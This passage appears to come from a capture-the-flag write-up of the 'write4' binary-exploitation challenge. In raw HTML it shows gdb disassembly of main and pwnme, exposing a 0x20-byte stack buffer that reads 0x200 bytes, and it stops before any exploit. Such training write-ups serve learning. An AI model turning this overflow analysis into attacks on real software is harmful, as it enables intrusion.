&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;main&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400607&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400608&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040060b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400500&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;pwnme@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400610&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400615&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400616&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above, the main function only calls pwnme function which looks interesting to us. Disassemble the &lt;strong&gt;pwnme&lt;/strong&gt; function as shown below. pwnme@plt is used for referencing the pwnme real address. we disassemble the libwrite4 library as shown in the code below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;vx@archie:&lt;span style=&#34;color:#06b6ef&#34;&gt;write4$&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;gdb&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;q&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libwrite4.so&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libwrite4.so...&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;found&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;libwrite4.so&lt;/span&gt;)
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt; 
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;pwnme&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008aa&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008ab&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008ae&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008b2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rax,&lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x200727&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x200fe0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008b9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rax,&lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rax]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008bc&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    ecx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008c1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x2&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008c6&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008cb&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;33&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008ce&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;36&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x790&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;setvbuf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008d3&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;41&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x106&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x9e0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008da&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x730&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008df&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x111&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x9f7&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008e6&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x730&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008eb&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008ef&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008f4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    esi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008f9&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000008fc&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;82&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x760&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000901&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0xf8&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xa00&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000908&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x730&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000090d&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;99&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x115&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xa29&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000914&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;106&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    eax,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000919&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;111&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x750&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000091e&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;116&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rax,[rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;]
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000922&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;120&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x200&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000927&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,rax
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000092a&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000000092f&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;133&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x770&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000000934&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;138&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0xf1&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xa2c&lt;/span&gt;
